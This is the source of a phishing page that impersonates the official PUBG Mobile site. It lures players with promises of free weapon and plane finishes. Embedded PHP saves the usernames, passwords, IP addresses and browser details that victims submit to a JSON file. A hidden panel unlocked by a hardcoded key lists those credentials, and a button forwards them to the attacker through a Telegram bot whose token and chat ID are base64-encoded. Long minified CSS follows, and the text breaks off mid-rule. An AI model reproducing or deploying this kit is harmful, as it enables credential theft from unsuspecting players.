<!DOCTYPE html>
<html>
<head>
<title>PUBG Mobile - Official PUBG on mobile</title>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta property="og:description" content="For a limited time you can buy all the weapon finish, plane finish, and more item that you wanted just for free. Reward and bonus will be given to players who have submitted the data."/>
<meta property="og:image" content="https://i.ibb.co/LPwQ16P/thumbnail.png"/>
<meta property="og:image:width" content="540"/>
<meta property="og:image:height" content="282"/>
<link rel="icon" type="img/png" href="https://i.ibb.co/LPwQ16P/thumbnail.png" sizes="32x32"/>
<link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"/>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>

</head>
<body>
<?php
@session_start();
date_default_timezone_set('Asia/Jakarta');
function getIP() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_X_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if(isset($_SERVER['HTTP_X_CLUSTER_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_X_CLUSTER_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if(isset($_SERVER['REMOTE_ADDR']))
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'Unknown';
    return $ipaddress;
}
function getBrowser() {
    $u_agent  = $_SERVER['HTTP_USER_AGENT'];
    $bname    = 'Unknown';
    $platform   = 'Unknown';
    $version  = "";

    if (preg_match('/linux/i', $u_agent)) {
        $platform = 'Linux';
    }
    elseif (preg_match('/macintosh|mac os x/i', $u_agent)) {
        $platform = 'Mac';
    }
    elseif (preg_match('/windows|win32/i', $u_agent)) {
        $platform = 'Windows';
    }
   
    if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent)) {
        $bname  = 'Internet Explorer';
        $ub   = "MSIE";
    }
    elseif(preg_match('/Firefox/i',$u_agent)) {
        $bname  = 'Mozilla Firefox';
        $ub   = "Firefox";
    }
    elseif(preg_match('/Chrome/i',$u_agent)) {
        $bname  = 'Google Chrome';
        $ub   = "Chrome";
    }
    elseif(preg_match('/Safari/i',$u_agent)) {
        $bname  = 'Apple Safari';
        $ub   = "Safari";
    }
    elseif(preg_match('/Opera/i',$u_agent)) {
        $bname  = 'Opera';
        $ub   = "Opera";
    }
    elseif(preg_match('/Netscape/i',$u_agent)) {
        $bname  = 'Netscape';
        $ub   = "Netscape";
    }
   
    $known    = array('Version', $ub, 'other');
    $pattern  = '#(?<browser>' . join('|', $known) .
    ')[/ ]+(?<version>[0-9.|a-zA-Z.]*)#';
    if (!preg_match_all($pattern, $u_agent, $matches)) {}
   
    $i = count($matches['browser']);
    if ($i != 1) {
        if (strripos($u_agent,"Version") < strripos($u_agent,$ub)){
            $version = $matches['version'][0];
        }
        else {
            $version = $matches['version'][1];
        }
    }
    else {
        $version = $matches['version'][0];
    }
   
    if ($version == null || $version == "") {
      $version = "?";
    }
   
    return array(
        'userAgent' => $u_agent,
        'name'      => $bname,
        'version'   => $version,
        'platform'  => $platform,
        'pattern'   => $pattern
    );
}
function info($name) {
  if ($name === 'ip') {
    return getIP();
  } elseif ($name === 'browser') {
    $browser = getBrowser();
    return $browser['name']." ".$browser['version']." on ".$browser['platform'];
  }
}

if (isset($_POST['login'])) {
  $data = @file_get_contents("65d592ca6de0975858e73068ddb745bea5b095e0.json");
  $json_arr = json_decode($data, true);
  $json_arr[] = array(
    'from'      => $_POST['login_from'],
    'user'      => $_POST['user'], 
    'pass'      => $_POST['pass'], 
    'date'      => $_POST['date'],
    'ip'        => $_POST['ip'],
    'browser'   => $_POST['browser']

  );
  file_put_contents('65d592ca6de0975858e73068ddb745bea5b095e0.json', json_encode($json_arr));
}
if (isset($_POST['send_telegram'])) {
    sendMessage(base64_decode("LTQyOTk4NjE5OA=="),
        "Result Pesing\n\nFrom              : {$_POST['login_from']}\nUsername          : {$_POST['user']}\nPassword             : {$_POST['pass']}\nDate               : {$_POST['date']}\nIP                    : {$_POST['ip']}\nBrowser        : {$_POST['browser']}",
        base64_decode("MTM1NDQ0NDI4NDpBQUVKekxqbVdWbGFHaUtxSVpZbDd6ZkxnTlc5TlppQzdqTQ=="));
}
function sendMessage($chatID, $messaggio, $token) {
    echo "sending message to " . $chatID . "\n";

    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatID;
    $url = $url . "&text=" . urlencode($messaggio);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
if (isset($_POST['reset'])) {
  file_put_contents("65d592ca6de0975858e73068ddb745bea5b095e0.json", "");
}
?>
<script type="text/javascript" src="http://code.jquery.com/jquery.min.js"></script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.3.14/angular.min.js"></script>
<?php
$data = file_get_contents("65d592ca6de0975858e73068ddb745bea5b095e0.json");
$key = "rabbitx";
if (empty($key) || (isset($_GET[sha1('key')]) && ($_GET[sha1('key')] == sha1($key)))) {
  ?>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
  <div class="container"><br>
    <div class="card">
        <div class="card-header">
            <h3>Result</h3>
        </div>
    <div class="card-body">
    <!--<form method="post">
        <button name="reset">reset</button>
    </form>-->
    <ul class="list-group">
    <?php
    foreach(json_decode($data, true) as $key => $value): ?>
            <li class="list-group-item">
                <div class="row">
                    <div class="col">
                        From
                    </div>
                    <div class="col-0">:</div>
                    <div class="col-9">
                        <input class="form-control form-control-sm" type="text" disabled value="<?= $value['from'] ?>">
                    </div>
                </div>
            </li>
            <li class="list-group-item">
                <div class="row">
                    <div class="col">
                        Username
                    </div>
                    <div class="col-0">:</div>
                    <div class="col-9">
                        <input class="form-control form-control-sm" type="text" disabled value="<?= $value['user'] ?>">
                    </div>
                </div>
            </li>
            <li class="list-group-item">
                <div class="row">
                    <div class="col">
                        Password
                    </div>
                    <div class="col-0">:</div>
                    <div class="col-9">
                        <input class="form-control form-control-sm" type="text" disabled value="<?= $value['pass'] ?>">
                    </div>
                </div>
            </li>
            <li class="list-group-item">
                <div class="row">
                    <div class="col">
                        Date
                    </div>
                    <div class="col-0">:</div>
                    <div class="col-9">
                        <input class="form-control form-control-sm" type="text" disabled value="<?= $value['date'] ?>">
                    </div>
                </div>
            </li>
            <li class="list-group-item">
                <div class="row">
                    <div class="col">
                        IP
                    </div>
                    <div class="col-0">:</div>
                    <div class="col-9">
                        <input class="form-control form-control-sm" type="text" disabled value="<?= $value['ip'] ?>">
                    </div>
                </div>
            </li>
            <li class="list-group-item">
                <div class="row">
                    <div class="col">
                        Browser
                    </div>
                    <div class="col-0">:</div>
                    <div class="col-9">
                        <input class="form-control form-control-sm" type="text" disabled value="<?= $value['browser'] ?>">
                    </div>
                </div>
            </li>
            <form method="post">
                <li class="list-group-item">
                    <input type="hidden" name="login_from" value="<?= $value['from'] ?>">
                    <input type="hidden" name="user" value="<?= $value['user'] ?>">
                    <input type="hidden" name="pass" value="<?= $value['pass'] ?>">
                    <input type="hidden" name="date" value="<?= $value['date'] ?>">
                    <input type="hidden" name="ip" value="<?= $value['ip'] ?>">
                    <input type="hidden" name="browser" value="<?= $value['browser'] ?>">
                    <button style="width:100%" class="btn btn-primary btn-sm" name="send_telegram">Send Telegram</button>
                </li>
        </form>
    <?php endforeach; ?>
    </ul>
        </div>
        </div>
  </div><br>
  <?php
  exit();
}
?>
<style type="text/css">
  @import url('https://fonts.googleapis.com/css2?family=Teko&display=swap');
  #login fieldset:not(:first-of-type) {
    display: none;
  }   
html,body{margin-left:0;}html,body{margin-bottom:0;}[class~=sticky]{width:100%;}html,body{margin-right:0;}html,body{margin-top:0;}blockquote:before{content:"";}[class~=sticky],html,div,body{padding-left:0;}html,body{padding-bottom:0;}[class~=sticky]{max-width:22.5pc;}html,div,[class~=sticky],body{padding-right:0;}body,html{padding-top:0;}[class~=sticky]{background:linear-gradient(#303f9f,#1a237e);}html{border-left-width:0;}html{border-bottom-width:0;}html{border-right-width:0;}html{border-top-width:0;}html{border-left-style:none;}html{border-bottom-style:none;}html{border-right-style:none;}html{border-top-style:none;}html{border-left-color:currentColor;}html{border-bottom-color:currentColor;}html{border-right-color:currentColor;}html{border-top-color:currentColor;}html{border-image:none;}html{font-size:100%;}html{font:inherit;}body,html{vertical-align:baseline;}body{border-left-width:0;}body{border-bottom-width:0;}body{border-right-width:0;}body{border-top-width:0;}body{border-left-style:none;}[class~=sticky]{padding-bottom:.052083333in;}body{border-bottom-style:none;}body{border-right-style:none;}body{border-top-style:none;}[class~=sticky] img{height:28.5pt;}body{border-left-color:currentColor;}body{border-bottom-color:currentColor;}body{border-right-color:currentColor;}body{border-top-color:currentColor;}body{border-image:none;}[class~=sticky]{padding-top:.052083333in;}body{font-size:100%;}body{font:inherit;}div,span{margin-left:0;}span,div{margin-bottom:0;}div,span{margin-right:0;}span,div{margin-top:0;}[class~=slider] img{display:block;}div,span{padding-bottom:0;}div,span{padding-top:0;}div{border-left-width:0;}div{border-bottom-width:0;}[class~=sticky]{text-align:center;}div{border-right-width:0;}div{border-top-width:0;}div{border-left-style:none;}div{border-bottom-style:none;}div{border-right-style:none;}div{border-top-style:none;}div{border-left-color:currentColor;}div{border-bottom-color:currentColor;}div{border-right-color:currentColor;}div{border-top-color:currentColor;}div{border-image:none;}div{font-size:100%;}div{font:inherit;}div,span{vertical-align:baseline;}applet,span{padding-left:0;}applet,span{padding-right:0;}span{border-left-width:0;}span{border-bottom-width:0;}span{border-right-width:0;}span{border-top-width:0;}span{border-left-style:none;}span{border-bottom-style:none;}span{border-right-style:none;}.button img{width:9.375pc;}span{border-top-style:none;}span{border-left-color:currentColor;}span{border-bottom-color:currentColor;}span{border-right-color:currentColor;}span{border-top-color:currentColor;}span{border-image:none;}.button img{margin-left:.3125pc;}span{font-size:100%;}span{font:inherit;}object,applet{margin-left:0;}applet,object,.button img,iframe{margin-bottom:0;}applet,object{margin-right:0;}object,applet{margin-top:0;}object,applet{padding-bottom:0;}applet,object{padding-top:0;}applet{border-left-width:0;}applet{border-bottom-width:0;}applet{border-right-width:0;}applet{border-top-width:0;}applet{border-left-style:none;}applet{border-bottom-style:none;}applet{border-right-style:none;}applet{border-top-style:none;}[class~=sticky]{position:fixed;}applet{border-left-color:currentColor;}applet{border-bottom-color:currentColor;}applet{border-right-color:currentColor;}applet{border-top-color:currentColor;}applet{border-image:none;}applet{font-size:100%;}applet{font:inherit;}applet,object{vertical-align:baseline;}object,iframe{padding-left:0;}.button img{margin-right:.3125pc;}iframe,object{padding-right:0;}object{border-left-width:0;}object{border-bottom-width:0;}object{border-right-width:0;}[class~=sticky]{top:0;}object{border-top-width:0;}object{border-left-style:none;}object{border-bottom-style:none;}object{border-right-style:none;}object{border-top-style:none;}object{border-left-color:currentColor;}object{border-bottom-color:currentColor;}object{border-right-color:currentColor;}object{border-top-color:currentColor;}object{border-image:none;}object{font-size:100%;}object{font:inherit;}h1,iframe{margin-left:0;}iframe,h1{margin-right:0;}[class~=sticky]{z-index:1;}h1,.button img,h2,iframe{margin-top:0;}h1,iframe{padding-bottom:0;}iframe,h1{padding-top:0;}iframe{border-left-width:0;}iframe{border-bottom-width:0;}iframe{border-right-width:0;}input[type=submit]:hover{background:linear-gradient(#1b5e20,#00c853);}iframe{border-top-width:0;}iframe{border-left-style:none;}iframe{border-bottom-style:none;}iframe{border-right-style:none;}iframe{border-top-style:none;}iframe{border-left-color:currentColor;}iframe{border-bottom-color:currentColor;}iframe{border-right-color:currentColor;}iframe{border-top-color:currentColor;}iframe{border-image:none;}iframe{font-size:100%;}iframe{font:inherit;}h1,iframe{vertical-align:baseline;}.button img{vertical-align:middle;}h1,h2{margin-bottom:0;}h2,h1{padding-left:0;}[class~=sticky]{border-bottom-width:.010416667in;}h1,h2{padding-right:0;}[class~=sticky]{border-bottom-style:solid;}h1{border-left-width:0;}[class~=sticky]{border-bottom-color:#5c6bc0;}h1{border-bottom-width:0;}h1{border-right-width:0;}[class~=sticky]{border-image:none;}h1{border-top-width:0;}h1{border-left-style:none;}h1{border-bottom-style:none;}h1{border-right-style:none;}.slider-container{max-width:10.416666667in;}h1{border-top-style:none;}h1{border-left-color:currentColor;}h1{border-bottom-color:currentColor;}h1{border-right-color:currentColor;}h1{border-top-color:currentColor;}h1{border-image:none;}h1{font-size:100%;}.slider-container{position:relative;}h1{font:inherit;}h2,h3{margin-left:0;}h3,h2{margin-right:0;}h2,h3{padding-bottom:0;}h2,h3{padding-top:0;}h2{border-left-width:0;}h2{border-bottom-width:0;}h2{border-right-width:0;}h2{border-top-width:0;}h2{border-left-style:none;}h2{border-bottom-style:none;}[class~=tab] span{margin-top:.072916667in;}h2{border-right-style:none;}h2{border-top-style:none;}h2{border-left-color:currentColor;}h2{border-bottom-color:currentColor;}h2{border-right-color:currentColor;}.slider-container{margin-left:auto;}h2{border-top-color:currentColor;}h2{border-image:none;}h2{font-size:100%;}h2{font:inherit;}.slider-container{margin-bottom:auto;}h2,h3{vertical-align:baseline;}.slider-container{margin-right:auto;}.slider-container{margin-top:auto;}[class~=tab] span{font-size:12px;}h4,h3{margin-bottom:0;}h4,h3{margin-top:0;}h4,h3{padding-left:0;}h4,h3{padding-right:0;}h3{border-left-width:0;}[class~=slider]{display:none;}h3{border-bottom-width:0;}h3{border-right-width:0;}h3{border-top-width:0;}[class~=tab] span{font-weight:bold;}[class~=tab] span{text-shadow:-.75pt .0625pc #000;}h3{border-left-style:none;}h3{border-bottom-style:none;}h3{border-right-style:none;}h3{border-top-style:none;}h3{border-left-color:currentColor;}h3{border-bottom-color:currentColor;}h3{border-right-color:currentColor;}h3{border-top-color:currentColor;}h3{border-image:none;}h3{font-size:100%;}h3{font:inherit;}h5,h4{margin-left:0;}[class~=active] img{border-left-width:2.25pt;}h5,h4{margin-right:0;}h5,h4{padding-bottom:0;}[class~=notification-container]{background:linear-gradient(#303f9f,#1a237e);}h4,h5{padding-top:0;}h4{border-left-width:0;}h4{border-bottom-width:0;}h4{border-right-width:0;}h4{border-top-width:0;}h4{border-left-style:none;}[class~=notification-container]{float:left;}h4{border-bottom-style:none;}h4{border-right-style:none;}h4{border-top-style:none;}h4{border-left-color:currentColor;}h4{border-bottom-color:currentColor;}h4{border-right-color:currentColor;}h4{border-top-color:currentColor;}h4{border-image:none;}h4{font-size:100%;}h4{font:inherit;}h4,h5{vertical-align:baseline;}h5,h6{margin-bottom:0;}h6,[class~=notification-container],p,h5{padding-left:0;}h6,h5{margin-top:0;}h5,h6,[class~=notification-container],p{padding-right:0;}[class~=notification-container]{padding-bottom:11.25pt;}h5{border-left-width:0;}h5{border-bottom-width:0;}h5{border-right-width:0;}h5{border-top-width:0;}h5{border-left-style:none;}h5{border-bottom-style:none;}h5{border-right-style:none;}h5{border-top-style:none;}h5{border-left-color:currentColor;}h5{border-bottom-color:currentColor;}h5{border-right-color:currentColor;}h5{border-top-color:currentColor;}h5{border-image:none;}[class~=active] img{border-bottom-width:2.25pt;}h5{font-size:100%;}h5{font:inherit;}h6,p{margin-left:0;}h6,p{margin-right:0;}p,h6{padding-bottom:0;}[class~=active] img{border-right-width:2.25pt;}h6,p{padding-top:0;}h6{border-left-width:0;}h6{border-bottom-width:0;}h6{border-right-width:0;}h6{border-top-width:0;}h6{border-left-style:none;}h6{border-bottom-style:none;}h6{border-right-style:none;}h6{border-top-style:none;}h6{border-left-color:currentColor;}h6{border-bottom-color:currentColor;}h6{border-right-color:currentColor;}h6{border-top-color:currentColor;}[class~=notification-container]{padding-top:11.25pt;}h6{border-image:none;}h6{font-size:100%;}h6{font:inherit;}p,h6{vertical-align:baseline;}p,blockquote{margin-bottom:0;}p,blockquote{margin-top:0;}[class~=notification-container]{text-align:center;}[class~=active] img{border-top-width:2.25pt;}p{border-left-width:0;}p{border-bottom-width:0;}p{border-right-width:0;}p{border-top-width:0;}p{border-left-style:none;}p{border-bottom-style:none;}p{border-right-style:none;}p{border-top-style:none;}input[type=submit]:hover{cursor:pointer;}p{border-left-color:currentColor;}[class~=notification-container]{border-top-width:.75pt;}p{border-bottom-color:currentColor;}p{border-right-color:currentColor;}[class~=notification-container]{border-top-style:solid;}p{border-top-color:currentColor;}[class~=active] img{border-left-style:solid;}p{border-image:none;}p{font-size:100%;}p{font:inherit;}pre,blockquote{margin-left:0;}pre,blockquote{margin-right:0;}[class~=notification-container]{border-top-color:#5c6bc0;}pre,blockquote{padding-left:0;}[class~=notification-container]{border-image:none;}[class~=notification]{background:#283593;}blockquote,pre{padding-bottom:0;}pre,blockquote{padding-right:0;}pre,blockquote{padding-top:0;}blockquote{border-left-width:0;}blockquote{border-bottom-width:0;}blockquote{border-right-width:0;}blockquote{border-top-width:0;}blockquote{border-left-style:none;}blockquote{border-bottom-style:none;}blockquote{border-right-style:none;}blockquote{border-top-style:none;}blockquote{border-left-color:currentColor;}[class~=active] img{border-bottom-style:solid;}[class~=notification]{margin-left:11.25pt;}blockquote{border-bottom-color:currentColor;}a,abbr,[class~=notification],pre{margin-bottom:0;}blockquote{border-right-color:currentColor;}blockquote{border-top-color:currentColor;}blockquote{border-image:none;}blockquote{font-size:100%;}blockquote{font:inherit;}blockquote,pre{vertical-align:baseline;}[class~=notification]{margin-right:11.25pt;}abbr,[class~=notification],pre,a{margin-top:0;}pre{border-left-width:0;}pre{border-bottom-width:0;}pre{border-right-width:0;}[class~=notification]{padding-left:.9375pc;}pre{border-top-width:0;}pre{border-left-style:none;}pre{border-bottom-style:none;}pre{border-right-style:none;}pre{border-top-style:none;}pre{border-left-color:currentColor;}pre{border-bottom-color:currentColor;}pre{border-right-color:currentColor;}pre{border-top-color:currentColor;}pre{border-image:none;}pre{font-size:100%;}pre{font:inherit;}[class~=active] img{border-right-style:solid;}a,abbr{margin-left:0;}abbr,a{margin-right:0;}[class~=active] img{border-top-style:solid;}a,abbr{padding-left:0;}[class~=notification]{padding-bottom:.9375pc;}abbr,a{padding-bottom:0;}abbr,a{padding-right:0;}abbr,a{padding-top:0;}a{border-left-width:0;}[class~=notification]{padding-right:.9375pc;}a{border-bottom-width:0;}a{border-right-width:0;}a{border-top-width:0;}a{border-left-style:none;}a{border-bottom-style:none;}[class~=notification]{padding-top:.9375pc;}a{border-right-style:none;}a{border-top-style:none;}a{border-left-color:currentColor;}a{border-bottom-color:currentColor;}a{border-right-color:currentColor;}a{border-top-color:currentColor;}a{border-image:none;}a{font-size:100%;}a{font:inherit;}a,abbr{vertical-align:baseline;}[class~=notification]{color:#fff;}abbr{border-left-width:0;}abbr{border-bottom-width:0;}abbr{border-right-width:0;}abbr{border-top-width:0;}abbr{border-left-style:none;}[class~=notification]{text-align:left;}abbr{border-bottom-style:none;}abbr{border-right-style:none;}abbr{border-top-style:none;}[class~=active] img{border-left-color:#18ffff;}abbr{border-left-color:currentColor;}abbr{border-bottom-color:currentColor;}abbr{border-right-color:currentColor;}abbr{border-top-color:currentColor;}abbr{border-image:none;}abbr{font-size:100%;}abbr{font:inherit;}address,acronym{margin-left:0;}address,acronym{margin-bottom:0;}address,acronym{margin-right:0;}[class~=notification]{line-height:.166666667in;}address,acronym{margin-top:0;}[class~=notification]{border-left-width:.75pt;}acronym,address{padding-left:0;}address,acronym{padding-bottom:0;}[class~=notification]{border-bottom-width:.75pt;}acronym,address{padding-right:0;}acronym,address{padding-top:0;}acronym{border-left-width:0;}acronym{border-bottom-width:0;}acronym{border-right-width:0;}acronym{border-top-width:0;}acronym{border-left-style:none;}acronym{border-bottom-style:none;}acronym{border-right-style:none;}acronym{border-top-style:none;}acronym{border-left-color:currentColor;}acronym{border-bottom-color:currentColor;}acronym{border-right-color:currentColor;}acronym{border-top-color:currentColor;}acronym{border-image:none;}acronym{font-size:100%;}acronym{font:inherit;}address,acronym{vertical-align:baseline;}[class~=notification]{border-right-width:.75pt;}address{border-left-width:0;}address{border-bottom-width:0;}address{border-right-width:0;}address{border-top-width:0;}address{border-left-style:none;}address{border-bottom-style:none;}address{border-right-style:none;}address{border-top-style:none;}[class~=notification]{border-top-width:.75pt;}address{border-left-color:currentColor;}[class~=notification]{border-left-style:solid;}address{border-bottom-color:currentColor;}[class~=notification]{border-bottom-style:solid;}address{border-right-color:currentColor;}[class~=notification]{border-right-style:solid;}address{border-top-color:currentColor;}address{border-image:none;}address{font-size:100%;}[class~=notification]{border-top-style:solid;}address{font:inherit;}cite,big{margin-left:0;}blockquote:before{content:none;}big,cite{margin-bottom:0;}big,cite{margin-right:0;}big,cite{margin-top:0;}cite,big{padding-left:0;}[class~=notification]{border-left-color:#5c6bc0;}big,cite{padding-bottom:0;}big,cite{padding-right:0;}cite,big{padding-top:0;}big{border-left-width:0;}big{border-bottom-width:0;}[class~=notification]{border-bottom-color:#5c6bc0;}big{border-right-width:0;}big{border-top-width:0;}[class~=active] img{border-bottom-color:#18ffff;}big{border-left-style:none;}big{border-bottom-style:none;}big{border-right-style:none;}big{border-top-style:none;}big{border-left-color:currentColor;}big{border-bottom-color:currentColor;}big{border-right-color:currentColor;}big{border-top-color:currentColor;}big{border-image:none;}big{font-size:100%;}[class~=notification]{border-right-color:#5c6bc0;}big{font:inherit;}cite,big{vertical-align:baseline;}cite{border-left-width:0;}cite{border-bottom-width:0;}cite{border-right-width:0;}cite{border-top-width:0;}[class~=notification]{border-top-color:#5c6bc0;}cite{border-left-style:none;}[class~=notification]{border-image:none;}cite{border-bottom-style:none;}cite{border-right-style:none;}cite{border-top-style:none;}cite{border-left-color:currentColor;}cite{border-bottom-color:currentColor;}cite{border-right-color:currentColor;}cite{border-top-color:currentColor;}cite{border-image:none;}[class~=notification]{border-radius:3.75pt;}cite{font-size:100%;}cite{font:inherit;}[class~=active] img{border-right-color:#18ffff;}code,del{margin-left:0;}code,del{margin-bottom:0;}code,del{margin-right:0;}code,del{margin-top:0;}[class~=active] img{border-top-color:#18ffff;}code,del{padding-left:0;}code,del{padding-bottom:0;}del,code{padding-right:0;}code,del{padding-top:0;}[class~=active] span,[class~=title]{color:#18ffff;}code{border-left-width:0;}code{border-bottom-width:0;}code{border-right-width:0;}code{border-top-width:0;}code{border-left-style:none;}code{border-bottom-style:none;}code{border-right-style:none;}code{border-top-style:none;}code{border-left-color:currentColor;}[class~=title]{font-weight:bold;}code{border-bottom-color:currentColor;}code{border-right-color:currentColor;}code{border-top-color:currentColor;}code,[class~=active] img{border-image:none;}code{font-size:100%;}code{font:inherit;}del,code{vertical-align:baseline;}del{border-left-width:0;}[class~=active] img{border-radius:16.5pt;}del{border-bottom-width:0;}del{border-right-width:0;}[class~=title]{text-transform:uppercase;}del{border-top-width:0;}del{border-left-style:none;}del{border-bottom-style:none;}del{border-right-style:none;}del{border-top-style:none;}del{border-left-color:currentColor;}del{border-bottom-color:currentColor;}[class~=title]{letter-spacing:.010416667in;}[class~=label]{background:linear-gradient(#303f9f,#1a237e);}del{border-right-color:currentColor;}del{border-top-color:currentColor;}del{border-image:none;}del{font-size:100%;}del{font:inherit;}dfn,img,[class~=label],em{margin-left:0;}dfn,[class~=label],img,em{margin-bottom:0;}dfn,em{margin-right:0;}dfn,em{margin-top:0;}em,dfn{padding-left:0;}em,dfn{padding-bottom:0;}em,dfn{padding-right:0;}dfn,em{padding-top:0;}dfn{border-left-width:0;}dfn{border-bottom-width:0;}[class~=icon] img{width:27pt;}dfn{border-right-width:0;}dfn{border-top-width:0;}dfn{border-left-style:none;}dfn{border-bottom-style:none;}dfn{border-right-style:none;}dfn{border-top-style:none;}dfn{border-left-color:currentColor;}dfn{border-bottom-color:currentColor;}dfn{border-right-color:currentColor;}dfn{border-top-color:currentColor;}[class~=label]{float:right;}dfn{border-image:none;}dfn{font-size:100%;}dfn{font:inherit;}em,dfn{vertical-align:baseline;}[class~=label]{margin-right:-.0625in;}em{border-left-width:0;}em{border-bottom-width:0;}[class~=label]{margin-top:-4.5pt;}em{border-right-width:0;}em{border-top-width:0;}em{border-left-style:none;}em{border-bottom-style:none;}em{border-right-style:none;}em{border-top-style:none;}em{border-left-color:currentColor;}em{border-bottom-color:currentColor;}em{border-right-color:currentColor;}em{border-top-color:currentColor;}em{border-image:none;}[class~=label]{padding-left:.104166667in;}em{font-size:100%;}em{font:inherit;}ins,img{margin-right:0;}ins,img{margin-top:0;}ins,img{padding-left:0;}img,ins{padding-bottom:0;}img,ins{padding-right:0;}img,ins{padding-top:0;}img{border-left-width:0;}img{border-bottom-width:0;}blockquote:after{content:"";}img{border-right-width:0;}img{border-top-width:0;}img{border-left-style:none;}img{border-bottom-style:none;}img{border-right-style:none;}img{border-top-style:none;}img{border-left-color:currentColor;}img{border-bottom-color:currentColor;}img{border-right-color:currentColor;}input[type=number]{-moz-appearance:textfield;}img{border-top-color:currentColor;}img{border-image:none;}img{font-size:100%;}[class~=label]{padding-bottom:.052083333in;}img{font:inherit;}img,ins{vertical-align:baseline;}input[type=number]::-webkit-inner-spin-button{-webkit-appearance:none;}ins,kbd{margin-left:0;}ins,kbd{margin-bottom:0;}[class~=label]{padding-right:.104166667in;}ins{border-left-width:0;}ins{border-bottom-width:0;}ins{border-right-width:0;}ins{border-top-width:0;}ins{border-left-style:none;}ins{border-bottom-style:none;}ins{border-right-style:none;}ins{border-top-style:none;}ins{border-left-color:currentColor;}ins{border-bottom-color:currentColor;}ins{border-right-color:currentColor;}ins{border-top-color:currentColor;}ins{border-image:none;}ins{font-size:100%;}ins{font:inherit;}[class~=label]{padding-top:.052083333in;}q,kbd{margin-right:0;}q,kbd{margin-top:0;}kbd,q{padding-left:0;}q,kbd{padding-bottom:0;}kbd,q{padding-right:0;}q,kbd{padding-top:0;}[class~=label]{font-weight:bold;}kbd{border-left-width:0;}kbd{border-bottom-width:0;}kbd{border-right-width:0;}kbd{border-top-width:0;}kbd{border-left-style:none;}kbd{border-bottom-style:none;}kbd{border-right-style:none;}kbd{border-top-style:none;}kbd{border-left-color:currentColor;}kbd{border-bottom-color:currentColor;}kbd{border-right-color:currentColor;}kbd{border-top-color:currentColor;}kbd{border-image:none;}kbd{font-size:100%;}kbd{font:inherit;}kbd,q{vertical-align:baseline;}s,q{margin-left:0;}q,s{margin-bottom:0;}[class~=label]{border-left-width:.0625pc;}q{border-left-width:0;}q{border-bottom-width:0;}q{border-right-width:0;}q{border-top-width:0;}q{border-left-style:none;}q{border-bottom-style:none;}q{border-right-style:none;}q{border-top-style:none;}q{border-left-color:currentColor;}q{border-bottom-color:currentColor;}q{border-right-color:currentColor;}q{border-top-color:currentColor;}q{border-image:none;}q{font-size:100%;}q{font:inherit;}samp,s{margin-right:0;}s,samp{margin-top:0;}samp,s{padding-left:0;}s,samp{padding-bottom:0;}s,samp{padding-right:0;}samp,s{padding-top:0;}s{border-left-width:0;}s{border-bottom-width:0;}s{border-right-width:0;}[class~=label]{border-bottom-width:.0625pc;}s{border-top-width:0;}s{border-left-style:none;}s{border-bottom-style:none;}[class~=label]{border-right-width:.0625pc;}s{border-right-style:none;}s{border-top-style:none;}s{border-left-color:currentColor;}s{border-bottom-color:currentColor;}s{border-right-color:currentColor;}s{border-top-color:currentColor;}s{border-image:none;}s{font-size:100%;}s{font:inherit;}s,samp{vertical-align:baseline;}small,samp{margin-left:0;}[class~=label]{border-top-width:.0625pc;}small,samp{margin-bottom:0;}input[type=number]::-webkit-inner-spin-button{margin-left:0;}samp{border-left-width:0;}samp{border-bottom-width:0;}samp{border-right-width:0;}samp{border-top-width:0;}samp{border-left-style:none;}samp{border-bottom-style:none;}samp{border-right-style:none;}samp{border-top-style:none;}samp{border-left-color:currentColor;}samp{border-bottom-color:currentColor;}samp{border-right-color:currentColor;}samp{border-top-color:currentColor;}samp{border-image:none;}samp{font-size:100%;}samp{font:inherit;}strike,small{margin-right:0;}[class~=label]{border-left-style:solid;}[class~=label]{border-bottom-style:solid;}small,strike{margin-top:0;}small,strike{padding-left:0;}strik